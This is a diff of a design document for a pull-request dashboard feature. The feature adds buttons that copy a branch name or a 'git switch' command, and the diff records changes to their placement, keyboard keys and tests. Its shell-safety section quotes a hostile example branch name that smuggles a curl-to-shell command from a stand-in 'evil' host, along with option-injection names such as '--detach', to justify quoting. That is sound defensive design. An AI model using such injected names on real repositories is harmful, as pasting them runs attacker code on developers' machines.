@@ -4,16 +4,18 @@
 **Issue:** none (asked by the user on 2026-10-27)
 **Target version:** 3.2.0
 
-Reviewed with the user: the placement (icons after the title), the keys
-(`c`, `b`) and the module (option A below). The rest is *Decided*.
+Reviewed with the user: the placement (icons after the title, then moved
+after the open tasks on 2026-10-28), the keys (`c`, `b`), the module
+(option A below) and, after the implementation, `git switch` in place of
+`git checkout` (2026-10-28). The rest is *Decided*.
 
 ## 1. Problem
 
 To work on a pull request locally, its source branch has to be found in
 Bitbucket and typed or copied by hand: the row shows no branch name (only
 the root branches have a header). The user wants two buttons on each
-pull request: one copying `git checkout <branch>`, one copying the branch
-name.
+pull request: one copying the command switching to the branch, one
+copying the branch name.
 
 ## 2. Data
 
@@ -25,39 +27,43 @@ name.
 ### 3.1 What is copied
 
 - **Branch name**: `source.branch.name` as it is.
-- **Checkout command**: `git checkout <branch>`, from a pure
-  `checkoutCommand(branch)`. *Decided*: a branch name is untrusted text
+- **Switch command**: `git switch <branch>`, from a pure
+  `switchCommand(branch)`. *Decided*: a branch name is untrusted text
   that ends up in a shell. Git allows `$`, `;`, `|`, `&`, `` ` ``, `(`,
   `)`, `<`, `>`, `!`, `#`, `{`, `}` and both quotes in a branch name, so
   anyone who can push may name a branch ``x;curl${IFS}evil|sh``, and
   pasting the command would run it. A name made only of letters, digits
-  and `. _ / - + @ = , %` is left bare (`git checkout feature/ABC-1-export`);
+  and `. _ / - + @ = , %` is left bare (`git switch feature/ABC-1-export`);
   any other is put in single quotes, each `'` in it written `'\''`
-  (`git checkout 'x;curl${IFS}evil|sh'`). Git forbids spaces, control
+  (`git switch 'x;curl${IFS}evil|sh'`). Git forbids spaces, control
   characters and `~ ^ : ? * [ \` in a branch name.
-- **Read by git as a branch only** (after the review of the branch): the
-  command ends with `--` (`git checkout feature/x --`). Without it, a name
-  that is also a path of the repository (`docs`), not fetched yet, makes
-  `git checkout docs` restore that path from the index, losing its
-  changes; with it, git creates the branch from a fetched remote branch as
-  before, and fails ("invalid reference") otherwise. A name starting with
-  `-` follows `--end-of-options` (`git checkout --end-of-options -f --`):
+- **Read by git as a branch only**: the review of the branch found that
+  `git checkout docs`, with a branch `docs` not fetched yet, restores the
+  folder `docs/` from the index, losing its changes. The command first
+  ended with `--` (`git checkout docs --`); the user then chose
+  `git switch`, which never reads a path: it creates the branch from a
+  fetched remote branch, as `git checkout` does, and fails ("invalid
+  reference") otherwise. A name starting with `-` follows
+  `--end-of-options` (`git switch --end-of-options --detach`):
   `git check-ref-format --branch` refuses a leading `-`, but
-  `refs/heads/-f` can be pushed, and `git checkout -f` would throw the
-  uncommitted changes away. Both checked with git 2.54 and zsh.
+  `refs/heads/--detach` can be pushed, and `git switch --detach` would
+  leave the branch for a detached HEAD (`git checkout -f` would have
+  thrown the uncommitted changes away). Checked with git 2.54 and zsh.
 - **A pull request from a fork** (#127): the same command, although the
   branch is not in the destination clone. *Decided*: #127 covers forks
   across the page; a comment there records this case.
 
 ### 3.2 The row
 
-Two `<button type="button" class="copy-button …">` right after the title
-and the Draft badge, in the pull request's header:
+Two `<button type="button" class="copy-button …">` at the end of the
+line of the participants, after the commit counts and the open tasks
+(first placed after the title and the Draft badge; moved by the user so
+the title line holds the title only):
 
 | Button | Class | Icon | Copies | Accessible name |
 |---|---|---|---|---|
 | Branch | `copy-branch` | `fas fa-copy` | the branch name | Copy the branch name `<branch>` |
-| Checkout | `copy-checkout` | `fas fa-terminal` | `checkoutCommand(branch)` | Copy `<command>` |
+| Switch | `copy-switch` | `fas fa-terminal` | `switchCommand(branch)` | Copy `<command>` |
 
 Each carries what it copies in `data-copy`, and `title="Copy: <text>"`;
 every interpolated text goes through `escapeHtml` (NFR-SEC7); the icons
@@ -67,7 +73,9 @@ The icons are drawn in `--text-muted` (4.5:1 on the surface in both
 themes), in `--text-color` when the row is hovered, holds the focus
 (`:focus-within`) or is selected. Never hidden, so they stay discoverable
 and clickable without hovering first; the 2px `:focus-visible` outline of
-every control applies. Root-branch headers and orphaned issues get no
+every control applies. A dimmed row (`.filtered`, shown for a match below
+it) hides its participants line, the buttons with it; `c` and `b` still
+click them. Root-branch headers and orphaned issues get no
 buttons: a root branch is a destination (`master`), an orphaned issue has
 no branch.
 
@@ -75,7 +83,7 @@ no branch.
 
 A new module, `public/copy-branch.js`:
 
-- `checkoutCommand(branch)`: §3.1, pure.
+- `switchCommand(branch)`: §3.1, pure.
 - `handleCopyClick(event, options)`: returns `false` for a click outside
   a `.copy-button`; otherwise writes the button's `data-copy` with
   `navigator.clipboard.writeText` and returns `true`. `options` carries
@@ -113,7 +121,7 @@ listener selects the row, as for the title link.
 
 In `handleTreeKey` (tree-keyboard.js), on the row in sight:
 
-- `c` clicks its `.copy-checkout` button,
+- `c` clicks its `.copy-switch` button,
 - `b` clicks its `.copy-branch` button,
 
 as `o` and `i` click a link today (`openLink` becomes a `clickIn(row,
@@ -132,10 +140,10 @@ drawer) apply unchanged; neither key is used elsewhere.
   tooltip shows the exact text copied.
 - **Icons hidden until hover**: invisible to the keyboard and to a first
   look; muted is enough.
-- **`git fetch && git checkout`**: the user asked for `git checkout`;
-  git's DWIM creates the tracking branch from a fetched remote branch.
-- **`git switch <branch>`** (never reads a path): the user asked for
-  `git checkout`; the trailing `--` gives it the same safety.
+- **`git fetch && git switch`**: git's DWIM creates the tracking branch
+  from a fetched remote branch; a fetch is the user's call.
+- **`git checkout <branch> --`** (the first implementation): as safe, but
+  the trailing `--` puzzles; `git switch` (git 2.23) needs none.
 - **`document.execCommand('copy')` fallback** over plain http: deprecated;
   the dashboard runs on localhost, and the failure says why.
 - **Buttons on root-branch headers**: a destination branch is checked out
@@ -143,7 +151,7 @@ drawer) apply unchanged; neither key is used elsewhere.
 
 ## 5. Tests
 
-- `test/copy-branch.test.mjs`: `checkoutCommand` (a plain name; `$`, `;`,
+- `test/copy-branch.test.mjs`: `switchCommand` (a plain name; `$`, `;`,
   `|`, a backtick, `'` quoted; a `'` escaped); `handleCopyClick` on fake
   elements with a fake clipboard and timer: a click elsewhere returns
   `false` and writes nothing; a click on the button or its icon writes
